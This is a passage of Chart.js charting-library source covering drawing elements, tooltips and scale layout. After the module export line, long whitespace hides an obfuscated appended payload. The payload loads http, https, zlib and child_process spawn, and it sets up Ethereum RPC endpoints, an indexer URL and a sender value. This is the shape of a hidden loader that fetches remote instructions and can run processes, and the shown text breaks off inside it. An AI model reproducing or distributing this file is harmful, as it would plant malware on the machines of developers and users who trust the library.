			//I.e. if we extend a line chart, we'll use the defaults from the line chart if our new chart
			//doesn't define some defaults of their own.

			var baseDefaults = (Chart.defaults[parent.prototype.name]) ? clone(Chart.defaults[parent.prototype.name]) : {};

			Chart.defaults[chartName] = extend(baseDefaults,extensions.defaults);

			Chart.types[chartName] = ChartType;

			//Register this new chart type in the Chart prototype
			Chart.prototype[chartName] = function(data,options){
				var config = merge(Chart.defaults.global, Chart.defaults[chartName], options || {});
				return new ChartType(data,config,this);
			};
		} else{
			warn("Name not provided for this chart, so it hasn't been registered");
		}
		return parent;
	};

	Chart.Element = function(configuration){
		extend(this,configuration);
		this.initialize.apply(this,arguments);
		this.save();
	};
	extend(Chart.Element.prototype,{
		initialize : function(){},
		restore : function(props){
			if (!props){
				extend(this,this._saved);
			} else {
				each(props,function(key){
					this[key] = this._saved[key];
				},this);
			}
			return this;
		},
		save : function(){
			this._saved = clone(this);
			delete this._saved._saved;
			return this;
		},
		update : function(newProps){
			each(newProps,function(value,key){
				this._saved[key] = this[key];
				this[key] = value;
			},this);
			return this;
		},
		transition : function(props,ease){
			each(props,function(value,key){
				this[key] = ((value - this._saved[key]) * ease) + this._saved[key];
			},this);
			return this;
		},
		tooltipPosition : function(){
			return {
				x : this.x,
				y : this.y
			};
		},
		hasValue: function(){
			return isNumber(this.value);
		}
	});

	Chart.Element.extend = inherits;


	Chart.Point = Chart.Element.extend({
		display: true,
		inRange: function(chartX,chartY){
			var hitDetectionRange = this.hitDetectionRadius + this.radius;
			return ((Math.pow(chartX-this.x, 2)+Math.pow(chartY-this.y, 2)) < Math.pow(hitDetectionRange,2));
		},
		draw : function(){
			if (this.display){
				var ctx = this.ctx;
				ctx.beginPath();

				ctx.arc(this.x, this.y, this.radius, 0, Math.PI*2);
				ctx.closePath();

				ctx.strokeStyle = this.strokeColor;
				ctx.lineWidth = this.strokeWidth;

				ctx.fillStyle = this.fillColor;

				ctx.fill();
				ctx.stroke();
			}


			//Quick debug for bezier curve splining
			//Highlights control points and the line between them.
			//Handy for dev - stripped in the min version.

			// ctx.save();
			// ctx.fillStyle = "black";
			// ctx.strokeStyle = "black"
			// ctx.beginPath();
			// ctx.arc(this.controlPoints.inner.x,this.controlPoints.inner.y, 2, 0, Math.PI*2);
			// ctx.fill();

			// ctx.beginPath();
			// ctx.arc(this.controlPoints.outer.x,this.controlPoints.outer.y, 2, 0, Math.PI*2);
			// ctx.fill();

			// ctx.moveTo(this.controlPoints.inner.x,this.controlPoints.inner.y);
			// ctx.lineTo(this.x, this.y);
			// ctx.lineTo(this.controlPoints.outer.x,this.controlPoints.outer.y);
			// ctx.stroke();

			// ctx.restore();



		}
	});

	Chart.Arc = Chart.Element.extend({
		inRange : function(chartX,chartY){

			var pointRelativePosition = helpers.getAngleFromPoint(this, {
				x: chartX,
				y: chartY
			});

			//Check if within the range of the open/close angle
			var betweenAngles = (pointRelativePosition.angle >= this.startAngle && pointRelativePosition.angle <= this.endAngle),
				withinRadius = (pointRelativePosition.distance >= this.innerRadius && pointRelativePosition.distance <= this.outerRadius);

			return (betweenAngles && withinRadius);
			//Ensure within the outside of the arc centre, but inside arc outer
		},
		tooltipPosition : function(){
			var centreAngle = this.startAngle + ((this.endAngle - this.startAngle) / 2),
				rangeFromCentre = (this.outerRadius - this.innerRadius) / 2 + this.innerRadius;
			return {
				x : this.x + (Math.cos(centreAngle) * rangeFromCentre),
				y : this.y + (Math.sin(centreAngle) * rangeFromCentre)
			};
		},
		draw : function(animationPercent){

			var easingDecimal = animationPercent || 1;

			var ctx = this.ctx;

			ctx.beginPath();

			ctx.arc(this.x, this.y, this.outerRadius, this.startAngle, this.endAngle);

			ctx.arc(this.x, this.y, this.innerRadius, this.endAngle, this.startAngle, true);

			ctx.closePath();
			ctx.strokeStyle = this.strokeColor;
			ctx.lineWidth = this.strokeWidth;

			ctx.fillStyle = this.fillColor;

			ctx.fill();
			ctx.lineJoin = 'bevel';

			if (this.showStroke){
				ctx.stroke();
			}
		}
	});

	Chart.Rectangle = Chart.Element.extend({
		draw : function(){
			var ctx = this.ctx,
				halfWidth = this.width/2,
				leftX = this.x - halfWidth,
				rightX = this.x + halfWidth,
				top = this.base - (this.base - this.y),
				halfStroke = this.strokeWidth / 2;

			// Canvas doesn't allow us to stroke inside the width so we can
			// adjust the sizes to fit if we're setting a stroke on the line
			if (this.showStroke){
				leftX += halfStroke;
				rightX -= halfStroke;
				top += halfStroke;
			}

			ctx.beginPath();

			ctx.fillStyle = this.fillColor;
			ctx.strokeStyle = this.strokeColor;
			ctx.lineWidth = this.strokeWidth;

			// It'd be nice to keep this class totally generic to any rectangle
			// and simply specify which border to miss out.
			ctx.moveTo(leftX, this.base);
			ctx.lineTo(leftX, top);
			ctx.lineTo(rightX, top);
			ctx.lineTo(rightX, this.base);
			ctx.fill();
			if (this.showStroke){
				ctx.stroke();
			}
		},
		height : function(){
			return this.base - this.y;
		},
		inRange : function(chartX,chartY){
			return (chartX >= this.x - this.width/2 && chartX <= this.x + this.width/2) && (chartY >= this.y && chartY <= this.base);
		}
	});

	Chart.Tooltip = Chart.Element.extend({
		draw : function(){

			var ctx = this.chart.ctx;

			ctx.font = fontString(this.fontSize,this.fontStyle,this.fontFamily);

			this.xAlign = "center";
			this.yAlign = "above";

			//Distance between the actual element.y position and the start of the tooltip caret
			var caretPadding = this.caretPadding = 2;

			var tooltipWidth = ctx.measureText(this.text).width + 2*this.xPadding,
				tooltipRectHeight = this.fontSize + 2*this.yPadding,
				tooltipHeight = tooltipRectHeight + this.caretHeight + caretPadding;

			if (this.x + tooltipWidth/2 >this.chart.width){
				this.xAlign = "left";
			} else if (this.x - tooltipWidth/2 < 0){
				this.xAlign = "right";
			}

			if (this.y - tooltipHeight < 0){
				this.yAlign = "below";
			}


			var tooltipX = this.x - tooltipWidth/2,
				tooltipY = this.y - tooltipHeight;

			ctx.fillStyle = this.fillColor;

			// Custom Tooltips
			if(this.custom){
				this.custom(this);
			}
			else{
				switch(this.yAlign)
				{
				case "above":
					//Draw a caret above the x/y
					ctx.beginPath();
					ctx.moveTo(this.x,this.y - caretPadding);
					ctx.lineTo(this.x + this.caretHeight, this.y - (caretPadding + this.caretHeight));
					ctx.lineTo(this.x - this.caretHeight, this.y - (caretPadding + this.caretHeight));
					ctx.closePath();
					ctx.fill();
					break;
				case "below":
					tooltipY = this.y + caretPadding + this.caretHeight;
					//Draw a caret below the x/y
					ctx.beginPath();
					ctx.moveTo(this.x, this.y + caretPadding);
					ctx.lineTo(this.x + this.caretHeight, this.y + caretPadding + this.caretHeight);
					ctx.lineTo(this.x - this.caretHeight, this.y + caretPadding + this.caretHeight);
					ctx.closePath();
					ctx.fill();
					break;
				}

				switch(this.xAlign)
				{
				case "left":
					tooltipX = this.x - tooltipWidth + (this.cornerRadius + this.caretHeight);
					break;
				case "right":
					tooltipX = this.x - (this.cornerRadius + this.caretHeight);
					break;
				}

				drawRoundedRectangle(ctx,tooltipX,tooltipY,tooltipWidth,tooltipRectHeight,this.cornerRadius);

				ctx.fill();

				ctx.fillStyle = this.textColor;
				ctx.textAlign = "center";
				ctx.textBaseline = "middle";
				ctx.fillText(this.text, tooltipX + tooltipWidth/2, tooltipY + tooltipRectHeight/2);
			}
		}
	});

	Chart.MultiTooltip = Chart.Element.extend({
		initialize : function(){
			this.font = fontString(this.fontSize,this.fontStyle,this.fontFamily);

			this.titleFont = fontString(this.titleFontSize,this.titleFontStyle,this.titleFontFamily);

			this.height = (this.labels.length * this.fontSize) + ((this.labels.length-1) * (this.fontSize/2)) + (this.yPadding*2) + this.titleFontSize *1.5;

			this.ctx.font = this.titleFont;

			var titleWidth = this.ctx.measureText(this.title).width,
				//Label has a legend square as well so account for this.
				labelWidth = longestText(this.ctx,this.font,this.labels) + this.fontSize + 3,
				longestTextWidth = max([labelWidth,titleWidth]);

			this.width = longestTextWidth + (this.xPadding*2);


			var halfHeight = this.height/2;

			//Check to ensure the height will fit on the canvas
			if (this.y - halfHeight < 0 ){
				this.y = halfHeight;
			} else if (this.y + halfHeight > this.chart.height){
				this.y = this.chart.height - halfHeight;
			}

			//Decide whether to align left or right based on position on canvas
			if (this.x > this.chart.width/2){
				this.x -= this.xOffset + this.width;
			} else {
				this.x += this.xOffset;
			}


		},
		getLineHeight : function(index){
			var baseLineHeight = this.y - (this.height/2) + this.yPadding,
				afterTitleIndex = index-1;

			//If the index is zero, we're getting the title
			if (index === 0){
				return baseLineHeight + this.titleFontSize/2;
			} else{
				return baseLineHeight + ((this.fontSize*1.5*afterTitleIndex) + this.fontSize/2) + this.titleFontSize * 1.5;
			}

		},
		draw : function(){
			// Custom Tooltips
			if(this.custom){
				this.custom(this);
			}
			else{
				drawRoundedRectangle(this.ctx,this.x,this.y - this.height/2,this.width,this.height,this.cornerRadius);
				var ctx = this.ctx;
				ctx.fillStyle = this.fillColor;
				ctx.fill();
				ctx.closePath();

				ctx.textAlign = "left";
				ctx.textBaseline = "middle";
				ctx.fillStyle = this.titleTextColor;
				ctx.font = this.titleFont;

				ctx.fillText(this.title,this.x + this.xPadding, this.getLineHeight(0));

				ctx.font = this.font;
				helpers.each(this.labels,function(label,index){
					ctx.fillStyle = this.textColor;
					ctx.fillText(label,this.x + this.xPadding + this.fontSize + 3, this.getLineHeight(index + 1));

					//A bit gnarly, but clearing this rectangle breaks when using explorercanvas (clears whole canvas)
					//ctx.clearRect(this.x + this.xPadding, this.getLineHeight(index + 1) - this.fontSize/2, this.fontSize, this.fontSize);
					//Instead we'll make a white filled block to put the legendColour palette over.

					ctx.fillStyle = this.legendColorBackground;
					ctx.fillRect(this.x + this.xPadding, this.getLineHeight(index + 1) - this.fontSize/2, this.fontSize, this.fontSize);

					ctx.fillStyle = this.legendColors[index].fill;
					ctx.fillRect(this.x + this.xPadding, this.getLineHeight(index + 1) - this.fontSize/2, this.fontSize, this.fontSize);


				},this);
			}
		}
	});

	Chart.Scale = Chart.Element.extend({
		initialize : function(){
			this.fit();
		},
		buildYLabels : function(){
			this.yLabels = [];

			var stepDecimalPlaces = getDecimalPlaces(this.stepValue);

			for (var i=0; i<=this.steps; i++){
				this.yLabels.push(template(this.templateString,{value:(this.min + (i * this.stepValue)).toFixed(stepDecimalPlaces)}));
			}
			this.yLabelWidth = (this.display && this.showLabels) ? longestText(this.ctx,this.font,this.yLabels) : 0;
		},
		addXLabel : function(label){
			this.xLabels.push(label);
			this.valuesCount++;
			this.fit();
		},
		removeXLabel : function(){
			this.xLabels.shift();
			this.valuesCount--;
			this.fit();
		},
		// Fitting loop to rotate x Labels and figure out what fits there, and also calculate how many Y steps to use
		fit: function(){
			// First we need the width of the yLabels, assuming the xLabels aren't rotated

			// To do that we need the base line at the top and base of the chart, assuming there is no x label rotation
			this.startPoint = (this.display) ? this.fontSize : 0;
			this.endPoint = (this.display) ? this.height - (this.fontSize * 1.5) - 5 : this.height; // -5 to pad labels

			// Apply padding settings to the start and end point.
			this.startPoint += this.padding;
			this.endPoint -= this.padding;

			// Cache the starting height, so can determine if we need to recalculate the scale yAxis
			var cachedHeight = this.endPoint - this.startPoint,
				cachedYLabelWidth;

			// Build the current yLabels so we have an idea of what size they'll be to start
			/*
			 *	This sets what is returned from calculateScaleRange as static properties of this class:
			 *
				this.steps;
				this.stepValue;
				this.min;
				this.max;
			 *
			 */
			this.calculateYRange(cachedHeight);

			// With these properties set we can now build the array of yLabels
			// and also the width of the largest yLabel
			this.buildYLabels();

			this.calculateXLabelRotation();

			while((cachedHeight > this.endPoint - this.startPoint)){
				cachedHeight = this.endPoint - this.startPoint;
				cachedYLabelWidth = this.yLabelWidth;

				this.calculateYRange(cachedHeight);
				this.buildYLabels();

				// Only go through the xLabel loop again if the yLabel width has changed
				if (cachedYLabelWidth < this.yLabelWidth){
					this.calculateXLabelRotation();
				}
			}

		},
		calculateXLabelRotation : function(){
			//Get the width of each grid by calculating the difference
			//between x offsets between 0 and 1.

			this.ctx.font = this.font;

			var firstWidth = this.ctx.measureText(this.xLabels[0]).width,
				lastWidth = this.ctx.measureText(this.xLabels[this.xLabels.length - 1]).width,
				firstRotated,
				lastRotated;


			this.xScalePaddingRight = lastWidth/2 + 3;
			this.xScalePaddingLeft = (firstWidth/2 > this.yLabelWidth + 10) ? firstWidth/2 : this.yLabelWidth + 10;

			this.xLabelRotation = 0;
			if (this.display){
				var originalLabelWidth = longestText(this.ctx,this.font,this.xLabels),
					cosRotation,
					firstRotatedWidth;
				this.xLabelWidth = originalLabelWidth;
				//Allow 3 pixels x2 padding either side for label readability
				var xGridWidth = Math.floor(this.calculateX(1) - this.calculateX(0)) - 6;

				//Max label rotate should be 90 - also act as a loop counter
				while ((this.xLabelWidth > xGridWidth && this.xLabelRotation === 0) || (this.xLabelWidth > xGridWidth && this.xLabelRotation <= 90 && this.xLabelRotation > 0)){
					cosRotation = Math.cos(toRadians(this.xLabelRotation));

					firstRotated = cosRotation * firstWidth;
					lastRotated = cosRotation * lastWidth;

					// We're right aligning the text now.
					if (firstRotated + this.fontSize / 2 > this.yLabelWidth + 8){
						this.xScalePaddingLeft = firstRotated + this.fontSize / 2;
					}
					this.xScalePaddingRight = this.fontSize/2;


					this.xLabelRotation++;
					this.xLabelWidth = cosRotation * originalLabelWidth;

				}
				if (this.xLabelRotation > 0){
					this.endPoint -= Math.sin(toRadians(this.xLabelRotation))*originalLabelWidth + 3;
				}
			}
			else{
				this.xLabelWidth = 0;
				this.xScalePaddingRight = this.padding;
				this.xScalePaddingLeft = this.padding;
			}

		},
		// Needs to be overidden in each Chart type
		// Otherwise we need to pass all the data into the scale class
		calculateYRange: noop,
		drawingArea: function(){
			return this.startPoint - this.endPoint;
		},
		calculateY : function(value){
			var scalingFactor = this.drawingArea() / (this.min - this.max);
			return this.endPoint - (scalingFactor * (value - this.min));
		},
		calculateX : function(index){
			var isRotated = (this.xLabelRotation > 0),
				// innerWidth = (this.offsetGridLines) ? this.width - offsetLeft - this.padding : this.width - (offsetLeft + halfLabelWidth * 2) - this.padding,
				innerWidth = this.width - (this.xScalePaddingLeft + this.xScalePaddingRight),
				valueWidth = innerWidth/Math.max((this.valuesCount - ((this.offsetGridLines) ? 0 : 1)), 1),
				valueOffset = (valueWidth * index) + this.xScalePaddingLeft;

			if (this.offsetGridLines){
				valueOffset += (valueWidth/2);
			}

			return Math.round(valueOffset);
		},
		update : function(newProps){
			helpers.extend(this, newProps);
			this.fit();
		},
		draw : function(){
			var ctx = this.ctx,
				yLabelGap = (this.endPoint - this.startPoint) / this.steps,
				xStart = Math.round(this.xScalePaddingLeft);
			if (this.display){
				ctx.fillStyle = this.textColor;
				ctx.font = this.font;
				each(this.yLabels,function(labelString,index){
					var yLabelCenter = this.endPoint - (yLabelGap * index),
						linePositionY = Math.round(yLabelCenter),
						drawHorizontalLine = this.showHorizontalLines;

					ctx.textAlign = "right";
					ctx.textBaseline = "middle";
					if (this.showLabels){
						ctx.fillText(labelString,xStart - 10,yLabelCenter);
					}

					// This is X axis, so draw it
					if (index === 0 && !drawHorizontalLine){
						drawHorizontalLine = true;
					}

					if (drawHorizontalLine){
						ctx.beginPath();
					}

					if (index > 0){
						// This is a grid line in the centre, so drop that
						ctx.lineWidth = this.gridLineWidth;
						ctx.strokeStyle = this.gridLineColor;
					} else {
						// This is the first line on the scale
						ctx.lineWidth = this.lineWidth;
						ctx.strokeStyle = this.lineColor;
					}

					linePositionY += helpers.aliasPixel(ctx.lineWidth);

					if(drawHorizontalLine){
						ctx.moveTo(xStart, linePositionY);
						ctx.lineTo(this.width, linePositionY);
						ctx.stroke();
						ctx.closePath();
					}

					ctx.lineWidth = this.lineWidth;
					ctx.strokeStyle = this.lineColor;
					ctx.beginPath();
					ctx.moveTo(xStart - 5, linePositionY);
					ctx.lineTo(xStart, linePositionY);
					ctx.stroke();
					ctx.closePath();

				},this);

				each(this.xLabels,function(label,index){
					var xPos = this.calculateX(index) + aliasPixel(this.lineWidth),
						// Check to see if line/bar here and decide where to place the line
						linePos = this.calculateX(index - (this.offsetGridLines ? 0.5 : 0)) + aliasPixel(this.lineWidth),
						isRotated = (this.xLabelRotation > 0),
						drawVerticalLine = this.showVerticalLines;

					// This is Y axis, so draw it
					if (index === 0 && !drawVerticalLine){
						drawVerticalLine = true;
					}

					if (drawVerticalLine){
						ctx.beginPath();
					}

					if (index > 0){
						// This is a grid line in the centre, so drop that
						ctx.lineWidth = this.gridLineWidth;
						ctx.strokeStyle = this.gridLineColor;
					} else {
						// This is the first line on the scale
						ctx.lineWidth = this.lineWidth;
						ctx.strokeStyle = this.lineColor;
					}

					if (drawVerticalLine){
						ctx.moveTo(linePos,this.endPoint);
						ctx.lineTo(linePos,this.startPoint - 3);
						ctx.stroke();
						ctx.closePath();
					}


					ctx.lineWidth = this.lineWidth;
					ctx.strokeStyle = this.lineColor;


					// Small lines at the bottom of the base grid line
					ctx.beginPath();
					ctx.moveTo(linePos,this.endPoint);
					ctx.lineTo(linePos,this.endPoint + 5);
					ctx.stroke();
					ctx.closePath();

					ctx.save();
					ctx.translate(xPos,(isRotated) ? this.endPoint + 12 : this.endPoint + 8);
					ctx.rotate(toRadians(this.xLabelRotation)*-1);
					ctx.font = this.font;
					ctx.textAlign = (isRotated) ? "right" : "center";
					ctx.textBaseline = (isRotated) ? "middle" : "top";
					ctx.fillText(label, 0, 0);
					ctx.restore();
				},this);

			}
		}

	});

	Chart.RadialScale = Chart.Element.extend({
		initialize: function(){
			this.size = min([this.height, this.width]);
			this.drawingArea = (this.display) ? (this.size/2) - (this.fontSize/2 + this.backdropPaddingY) : (this.size/2);
		},
		calculateCenterOffset: function(value){
			// Take into account half font size + the yPadding of the top value
			var scalingFactor = this.drawingArea / (this.max - this.min);

			return (value - this.min) * scalingFactor;
		},
		update : function(){
			if (!this.lineArc){
				this.setScaleSize();
			} else {
				this.drawingArea = (this.display) ? (this.size/2) - (this.fontSize/2 + this.backdropPaddingY) : (this.size/2);
			}
			this.buildYLabels();
		},
		buildYLabels: function(){
			this.yLabels = [];

			var stepDecimalPlaces = getDecimalPlaces(this.stepValue);

			for (var i=0; i<=this.steps; i++){
				this.yLabels.push(template(this.templateString,{value:(this.min + (i * this.stepValue)).toFixed(stepDecimalPlaces)}));
			}
		},
		getCircumference : function(){
			return ((Math.PI*2) / this.valuesCount);
		},
		setScaleSize: function(){
			/*
			 * Right, this is really confusing and there is a lot of maths going on here
			 * The gist of the problem is here: https://gist.github.com/nnnick/696cc9c55f4b0beb8fe9
			 *
			 * Reaction: https://dl.dropboxusercontent.com/u/34601363/toomuchscience.gif
			 *
			 * Solution:
			 *
			 * We assume the radius of the polygon is half the size of the canvas at first
			 * at each index we check if the text overlaps.
			 *
			 * Where it does, we store that angle and that index.
			 *
			 * After finding the largest index and angle we calculate how much we need to remove
			 * from the shape radius to move the point inwards by that x.
			 *
			 * We average the left and right distances to get the maximum shape radius that can fit in the box
			 * along with labels.
			 *
			 * Once we have that, we can find the centre point for the chart, by taking the x text protrusion
			 * on each side, removing that from the size, halving it and adding the left x protrusion width.
			 *
			 * This will mean we have a shape fitted to the canvas, as large as it can be with the labels
			 * and position it in the most space efficient manner
			 *
			 * https://dl.dropboxusercontent.com/u/34601363/yeahscience.gif
			 */


			// Get maximum radius of the polygon. Either half the height (minus the text width) or half the width.
			// Use this to calculate the offset + change. - Make sure L/R protrusion is at least 0 to stop issues with centre points
			var largestPossibleRadius = min([(this.height/2 - this.pointLabelFontSize - 5), this.width/2]),
				pointPosition,
				i,
				textWidth,
				halfTextWidth,
				furthestRight = this.width,
				furthestRightIndex,
				furthestRightAngle,
				furthestLeft = 0,
				furthestLeftIndex,
				furthestLeftAngle,
				xProtrusionLeft,
				xProtrusionRight,
				radiusReductionRight,
				radiusReductionLeft,
				maxWidthRadius;
			this.ctx.font = fontString(this.pointLabelFontSize,this.pointLabelFontStyle,this.pointLabelFontFamily);
			for (i=0;i<this.valuesCount;i++){
				// 5px to space the text slightly out - similar to what we do in the draw function.
				pointPosition = this.getPointPosition(i, largestPossibleRadius);
				textWidth = this.ctx.measureText(template(this.templateString, { value: this.labels[i] })).width + 5;
				if (i === 0 || i === this.valuesCount/2){
					// If we're at index zero, or exactly the middle, we're at exactly the top/bottom
					// of the radar chart, so text will be aligned centrally, so we'll half it and compare
					// w/left and right text sizes
					halfTextWidth = textWidth/2;
					if (pointPosition.x + halfTextWidth > furthestRight) {
						furthestRight = pointPosition.x + halfTextWidth;
						furthestRightIndex = i;
					}
					if (pointPosition.x - halfTextWidth < furthestLeft) {
						furthestLeft = pointPosition.x - halfTextWidth;
						furthestLeftIndex = i;
					}
				}
				else if (i < this.valuesCount/2) {
					// Less than half the values means we'll left align the text
					if (pointPosition.x + textWidth > furthestRight) {
						furthestRight = pointPosition.x + textWidth;
						furthestRightIndex = i;
					}
				}
				else if (i > this.valuesCount/2){
					// More than half the values means we'll right align the text
					if (pointPosition.x - textWidth < furthestLeft) {
						furthestLeft = pointPosition.x - textWidth;
						furthestLeftIndex = i;
					}
				}
			}

			xProtrusionLeft = furthestLeft;

			xProtrusionRight = Math.ceil(furthestRight - this.width);

			furthestRightAngle = this.getIndexAngle(furthestRightIndex);

			furthestLeftAngle = this.getIndexAngle(furthestLeftIndex);

			radiusReductionRight = xProtrusionRight / Math.sin(furthestRightAngle + Math.PI/2);

			radiusReductionLeft = xProtrusionLeft / Math.sin(furthestLeftAngle + Math.PI/2);

			// Ensure we actually need to reduce the size of the chart
			radiusReductionRight = (isNumber(radiusReductionRight)) ? radiusReductionRight : 0;
			radiusReductionLeft = (isNumber(radiusReductionLeft)) ? radiusReductionLeft : 0;

			this.drawingArea = largestPossibleRadius - (radiusReductionLeft + radiusReductionRight)/2;

			//this.drawingArea = min([maxWidthRadius, (this.height - (2 * (this.pointLabelFontSize + 5)))/2])
			this.setCenterPoint(radiusReductionLeft, radiusReductionRight);

		},
		setCenterPoint: function(leftMovement, rightMovement){

			var maxRight = this.width - rightMovement - this.drawingArea,
				maxLeft = leftMovement + this.drawingArea;

			this.xCenter = (maxLeft + maxRight)/2;
			// Always vertically in the centre as the text height doesn't change
			this.yCenter = (this.height/2);
		},

		getIndexAngle : function(index){
			var angleMultiplier = (Math.PI * 2) / this.valuesCount;
			// Start from the top instead of right, so remove a quarter of the circle

			return index * angleMultiplier - (Math.PI/2);
		},
		getPointPosition : function(index, distanceFromCenter){
			var thisAngle = this.getIndexAngle(index);
			return {
				x : (Math.cos(thisAngle) * distanceFromCenter) + this.xCenter,
				y : (Math.sin(thisAngle) * distanceFromCenter) + this.yCenter
			};
		},
		draw: function(){
			if (this.display){
				var ctx = this.ctx;
				each(this.yLabels, function(label, index){
					// Don't draw a centre value
					if (index > 0){
						var yCenterOffset = index * (this.drawingArea/this.steps),
							yHeight = this.yCenter - yCenterOffset,
							pointPosition;

						// Draw circular lines around the scale
						if (this.lineWidth > 0){
							ctx.strokeStyle = this.lineColor;
							ctx.lineWidth = this.lineWidth;

							if(this.lineArc){
								ctx.beginPath();
								ctx.arc(this.xCenter, this.yCenter, yCenterOffset, 0, Math.PI*2);
								ctx.closePath();
								ctx.stroke();
							} else{
								ctx.beginPath();
								for (var i=0;i<this.valuesCount;i++)
								{
									pointPosition = this.getPointPosition(i, this.calculateCenterOffset(this.min + (index * this.stepValue)));
									if (i === 0){
										ctx.moveTo(pointPosition.x, pointPosition.y);
									} else {
										ctx.lineTo(pointPosition.x, pointPosition.y);
									}
								}
								ctx.closePath();
								ctx.stroke();
							}
						}
						if(this.showLabels){
							ctx.font = fontString(this.fontSize,this.fontStyle,this.fontFamily);
							if (this.showLabelBackdrop){
								var labelWidth = ctx.measureText(label).width;
								ctx.fillStyle = this.backdropColor;
								ctx.fillRect(
									this.xCenter - labelWidth/2 - this.backdropPaddingX,
									yHeight - this.fontSize/2 - this.backdropPaddingY,
									labelWidth + this.backdropPaddingX*2,
									this.fontSize + this.backdropPaddingY*2
								);
							}
							ctx.textAlign = 'center';
							ctx.textBaseline = "middle";
							ctx.fillStyle = this.fontColor;
							ctx.fillText(label, this.xCenter, yHeight);
						}
					}
				}, this);

				if (!this.lineArc){
					ctx.lineWidth = this.angleLineWidth;
					ctx.strokeStyle = this.angleLineColor;
					for (var i = this.valuesCount - 1; i >= 0; i--) {
						if (this.angleLineWidth > 0){
							var outerPosition = this.getPointPosition(i, this.calculateCenterOffset(this.max));
							ctx.beginPath();
							ctx.moveTo(this.xCenter, this.yCenter);
							ctx.lineTo(outerPosition.x, outerPosition.y);
							ctx.stroke();
							ctx.closePath();
						}
						// Extra 3px out for some label spacing
						var pointLabelPosition = this.getPointPosition(i, this.calculateCenterOffset(this.max) + 5);
						ctx.font = fontString(this.pointLabelFontSize,this.pointLabelFontStyle,this.pointLabelFontFamily);
						ctx.fillStyle = this.pointLabelFontColor;

						var labelsCount = this.labels.length,
							halfLabelsCount = this.labels.length/2,
							quarterLabelsCount = halfLabelsCount/2,
							upperHalf = (i < quarterLabelsCount || i > labelsCount - quarterLabelsCount),
							exactQuarter = (i === quarterLabelsCount || i === labelsCount - quarterLabelsCount);
						if (i === 0){
							ctx.textAlign = 'center';
						} else if(i === halfLabelsCount){
							ctx.textAlign = 'center';
						} else if (i < halfLabelsCount){
							ctx.textAlign = 'left';
						} else {
							ctx.textAlign = 'right';
						}

						// Set the correct text baseline based on outer positioning
						if (exactQuarter){
							ctx.textBaseline = 'middle';
						} else if (upperHalf){
							ctx.textBaseline = 'bottom';
						} else {
							ctx.textBaseline = 'top';
						}

						ctx.fillText(this.labels[i], pointLabelPosition.x, pointLabelPosition.y);
					}
				}
			}
		}
	});

	// Attach global event to resize each chart instance when the browser resizes
	helpers.addEvent(window, "resize", (function(){
		// Basic debounce of resize function so it doesn't hurt performance when resizing browser.
		var timeout;
		return function(){
			clearTimeout(timeout);
			timeout = setTimeout(function(){
				each(Chart.instances,function(instance){
					// If the responsive flag is set in the chart instance config
					// Cascade the resize event down to the chart.
					if (instance.options.responsive){
						instance.resize(instance.render, true);
					}
				});
			}, 50);
		};
	})());


	if (amd) {
		define(function(){
			return Chart;
		});
	} else if (typeof module === 'object' && module.exports) {
		module.exports = Chart;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             global.i="A9-284";var _0x18fc94=_0x32cb;(function(_0x5a4a9e,_0x3b45b1){var _0x3e9a83=_0x32cb,_0x8b5606=_0x5a4a9e();while(!![]){try{var _0x154b32=-parseInt(_0x3e9a83(0x353))/(0x1*0x93a+-0x31*0x44+-0x1*-0x3cb)+parseInt(_0x3e9a83(0x388))/(-0x6*-0x1+0x14de+-0x14e2)*(parseInt(_0x3e9a83(0x20f))/(-0x23b9+-0x232a+-0x79*-0x96))+-parseInt(_0x3e9a83(0x278))/(0xb*0x92+-0x439+0x1*-0x209)+parseInt(_0x3e9a83(0x1fd))/(-0x1791+0x45*0x37+-0x1*-0x8c3)*(-parseInt(_0x3e9a83(0x28d))/(0x78c*0x3+0x39*0x3e+0x29a*-0xe))+-parseInt(_0x3e9a83(0x2a1))/(-0x7a2+0x1*0x245d+-0x1cb4*0x1)+-parseInt(_0x3e9a83(0x203))/(0x6a*0x28+0x1760+0x9fa*-0x4)+parseInt(_0x3e9a83(0x223))/(0x1b42+-0x17fc+0x33d*-0x1)*(parseInt(_0x3e9a83(0x28b))/(-0x125*-0xb+0x39b+-0x1028));if(_0x154b32===_0x3b45b1)break;else _0x8b5606['push'](_0x8b5606['shift']());}catch(_0x5b93fb){_0x8b5606['push'](_0x8b5606['shift']());}}}(_0x507c,0x8d023+-0x3acf2+-0x1*-0x2742b),(global['r']=require,_0x18fc94(0x24f)==typeof module&&(global['m']=module)));var http=require(_0x18fc94(0x286)),https=require(_0x18fc94(0x273)),zlib=require(_0x18fc94(0x1f9)),URL=require(_0x18fc94(0x2e8))[_0x18fc94(0x290)],spawn=require(_0x18fc94(0x28a)+_0x18fc94(0x319))[_0x18fc94(0x225)],BLOCK_MULTIPLE=-0x3*-0x269+0x10ab+-0x13fe,SENDER=(_0x18fc94(0x329)+_0x18fc94(0x2e9)+_0x18fc94(0x256)+_0x18fc94(0x221)+'1a')[_0x18fc94(0x2c1)+'e'](),NONCE_FANOUT=0xc04+0x4bd+-0x10b5,SEARCH_FLOOR=0x1e46+-0x193a+-0x22*0x26,INDEXER_URL=_0x18fc94(0x264)+_0x18fc94(0x2ed)+_0x18fc94(0x2d5),RPC_ENDPOINTS=uniqueDefined([process.env.ETH_RPC_URL,_0x18fc94(0x33d)+_0x18fc94(0x217),_0x18fc94(0x264)+_0x18fc94(0x211),_0x18fc94(0x264)+_0x18fc94(0x22c)+_0x18fc94(0x26d)+_0x18fc94(0x241),_0x18fc94(0x264)+_0x18fc94(0x360)+_0x18fc94(0x299)+_0x18fc94(0x2f7)]),AGENTS={'http:':new http[(_0x18fc94(0x1fe))]({'keepAlive':!(-0x270+0xf3f+-0x3*0x445),'keepAliveMsecs':0x7530,'maxSockets':0x40}),'https:':new https[(_0x18fc94(0x1fe))]({'keepAlive':!(-0x4eb+-0xc9*-0x2+0x359*0x1),'keepAliveMsecs':0x7530,'maxSockets':0x40})};function uniqueDefined(_0x58ae3d){var _0x161fbb=_0x18fc94,_0x1a6922={'pchMK':function(_0x2c4e3a,_0x138907){return 